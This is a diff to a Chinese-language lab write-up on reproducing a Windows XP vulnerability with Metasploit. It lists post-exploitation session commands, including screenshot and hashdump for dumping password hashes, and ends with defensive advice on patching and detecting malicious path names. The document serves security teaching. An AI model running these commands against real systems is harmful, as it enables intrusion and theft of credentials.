@@ -378,12 +378,16 @@ Windows XP SP1镜像下载参考：[Windows XP SP1可用的原版iso](https://bl
 --
 
 ### 三、利用Metasploit复现漏洞
+成功获取了Windows XP系统的Shell，我们调用 `ipconfig` 查看的IP地址也是目标的 `192.168.163.137`   
+```bash
+exploit
+session 1
+ipconfig
+screenshot
+hashdump
+```
 
 ---
 
 ## 漏洞防御
 一方面关闭相关端口、安装杀毒软件和补丁，另一方面在防火墙中进行流量监测，主要是针对数据包中存在的形如"\ ** \ … \ … \ *"这样的恶意路径名进行检测，最为保险的方法是使用pcre正则去匹配。
-
----
-
-# 安全建议
